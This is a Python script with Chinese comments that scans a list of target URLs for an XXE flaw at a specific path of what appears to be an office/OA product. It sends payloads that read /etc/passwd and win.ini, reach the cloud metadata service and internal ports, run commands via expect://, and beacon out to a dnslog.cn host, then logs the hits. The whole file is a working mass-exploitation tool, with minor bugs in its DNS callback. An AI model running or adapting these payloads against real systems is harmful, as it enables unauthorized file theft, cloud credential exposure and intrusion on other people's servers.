import requests
import threading
from urllib.parse import urljoin
import time
import random
import hashlib
import os

# 配置信息
THREADS = 50  # 并发线程数
TIMEOUT = 10  # 请求超时时间
DELAY = 1  # 请求间隔延迟

# 各种XXE Payload模板
PAYLOADS = {
    "file_read_linux": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',

    "file_read_windows": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>''',

    "ssrf_internal": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<root>&xxe;</root>''',

    "ssrf_metadata": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>''',

    "expect_rce": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>''',

    "php_filter": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>''',

    "dns_ssrf": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://{dnslog}.dnslog.cn">
]>
<root>&xxe;</root>'''
}

# 敏感数据特征（用于检测文件读取成功）
SENSITIVE_PATTERNS = {
    'linux_passwd': ['root:', 'bin:', 'daemon:', '/bin/bash'],
    'windows_ini': ['for 16-bit app support', '[fonts]', '[extensions]'],
    'aws_metadata': ['instance-id', 'ami-id', 'hostname'],
    'command_output': ['uid=', 'gid=', 'groups='],
    'base64_encoded': ['root:x:0:0']  # base64解码后可能包含的内容
}

def generate_dnslog():
    random_str = "http://ds4tj2.dnslog.cn"
    return random_str

def check_response_content(response_text, payload_type):
    """
    检查响应内容是否包含敏感数据特征
    """
    text_lower = response_text.lower()
    
    if payload_type == "file_read_linux":
        for pattern in SENSITIVE_PATTERNS['linux_passwd']:
            if pattern.lower() in text_lower:
                return True, f"发现Linux敏感文件内容: {pattern}"
    
    elif payload_type == "file_read_windows":
        for pattern in SENSITIVE_PATTERNS['windows_ini']:
            if pattern.lower() in text_lower:
                return True, f"发现Windows敏感文件内容: {pattern}"
    
    elif payload_type == "ssrf_metadata":
        for pattern in SENSITIVE_PATTERNS['aws_metadata']:
            if pattern.lower() in text_lower:
                return True, f"发现云元数据: {pattern}"
    
    elif payload_type == "expect_rce":
        for pattern in SENSITIVE_PATTERNS['command_output']:
            if pattern.lower() in text_lower:
                return True, f"发现命令执行结果: {pattern}"
    
    # 检查base64编码内容
    if payload_type == "php_filter":
        # 简单的base64特征检查
        if len(response_text) > 50 and 'root:' in response_text:
            return True, "可能包含base64编码的敏感文件内容"
    
    return False, "未发现明显敏感数据"

def test_xxe_payload(target_url, payload_type, custom_dnslog=None):
    """
    测试特定的XXE Payload
    """
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/xml',
        'Accept': '*/*'
    }
    
    # 构造完整的请求URL
    full_url = urljoin(target_url, '/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService')
    
    # 准备payload
    if payload_type == "dns_ssrf" and custom_dnslog:
        payload = PAYLOADS[payload_type].format(dnslog=custom_dnslog)
    else:
        payload = PAYLOADS[payload_type]
    
    try:
        response = requests.post(
            full_url, 
            data=payload, 
            headers=headers, 
            timeout=TIMEOUT,
            verify=False,
            allow_redirects=False
        )
        
        # 检查响应
        is_vulnerable, reason = check_response_content(response.text, payload_type)
        
        result = {
            'url': target_url,
            'payload_type': payload_type,
            'status_code': response.status_code,
            'response_length': len(response.text),
            'is_vulnerable': is_vulnerable,
            'reason': reason,
            'response_preview': response.text[:200] if len(response.text) > 200 else response.text
        }
        
        return result
        
    except requests.exceptions.RequestException as e:
        return {
            'url': target_url,
            'payload_type': payload_type,
            'error': str(e),
            'is_vulnerable': False
        }

def scan_target(target_url):
    """
    对单个目标进行全面的XXE漏洞扫描
    """
    print(f"[*] 开始扫描: {target_url}")
    results = []
    
    # 为DNS SSRF生成唯一标识
    dnslog_id = generate_dnslog()
    
    # 测试所有payload类型
    for payload_type in PAYLOADS.keys():
        if payload_type == "dns_ssrf":
            result = test_xxe_payload(target_url, payload_type, dnslog_id)
        else:
            result = test_xxe_payload(target_url, payload_type)
        
        results.append(result)
        
        # 显示当前进度
        status = "存在漏洞" if result.get('is_vulnerable', False) else "安全"
        print(f"  [-] 测试 {payload_type}: {status}")
        
        # 延迟避免请求过快
        time.sleep(DELAY)
    
    return results

def save_vulnerable_result(target_url, payload_type, details):
    """
    保存漏洞结果到文件
    """
    with open('result_rce.txt', 'a', encoding='utf-8') as f:
        f.write("=" * 80 + "\n")
        f.write(f"漏洞类型: XXE {payload_type}\n")
        f.write(f"目标URL: {target_url}\n")
        f.write(f"检测时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"漏洞详情: {details}\n")
        f.write("=" * 80 + "\n\n")

def main():
    print("=" * 80)
    print("XXE高级漏洞检测脚本 - RCE/SSRF/文件读取检测")
    print("支持的检测类型:")
    print("  - Linux文件读取 (/etc/passwd)")
    print("  - Windows文件读取 (win.ini)")
    print("  - 内网SSRF探测")
    print("  - 云元数据SSRF")
    print("  - 命令执行(expect)")
    print("  - PHP过滤器文件读取")
    print("  - DNS SSRF外带数据")
    print("=" * 80)
    
    try:
        # 读取URL列表
        if not os.path.exists('url.txt'):
            print("[-] 找不到 url.txt 文件")
            print("[!] 请创建url.txt文件，每行一个目标URL")
            return
            
        with open('url.txt', 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
        
        if not urls:
            print("[-] url.txt文件中没有找到有效的URL")
            return
            
        print(f"[+] 共读取到 {len(urls)} 个URL")
        
        # 清空结果文件
        if os.path.exists('result_rce.txt'):
            os.remove('result_rce.txt')
        
        vulnerable_count = 0
        
        # 逐个扫描目标
        for i, url in enumerate(urls, 1):
            print(f"\n[+] 扫描进度: {i}/{len(urls)}")
            
            try:
                results = scan_target(url)
                
                # 分析结果
                for result in results:
                    if result.get('is_vulnerable', False):
                        vulnerable_count += 1
                        print(f"[!] 发现漏洞: {url} - {result['payload_type']}")
                        print(f"    |_ 原因: {result['reason']}")
                        
                        # 保存漏洞详情
                        details = f"状态码: {result.get('status_code', 'N/A')}, 响应长度: {result.get('response_length', 'N/A')}, 详情: {result['reason']}"
                        save_vulnerable_result(url, result['payload_type'], details)
                
                # 显示响应预览（如果有异常响应）
                for result in results:
                    if result.get('status_code', 0) not in [404, 403, 400] and result.get('response_length', 0) > 100:
                        print(f"    |_ {result['payload_type']} 响应预览: {result.get('response_preview', '')}")
                        
            except Exception as e:
                print(f"[-] 扫描 {url} 时发生错误: {e}")
                continue
        
        print("\n" + "=" * 80)
        print("[+] 扫描完成！")
        print(f"[!] 共发现 {vulnerable_count} 个存在漏洞的目标")
        if vulnerable_count > 0:
            print("[!] 漏洞详情已保存到 result_rce.txt 文件")
        print("=" * 80)
        
    except Exception as e:
        print(f"[-] 发生错误: {e}")

if __name__ == "__main__":
    # 忽略SSL警告
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    main()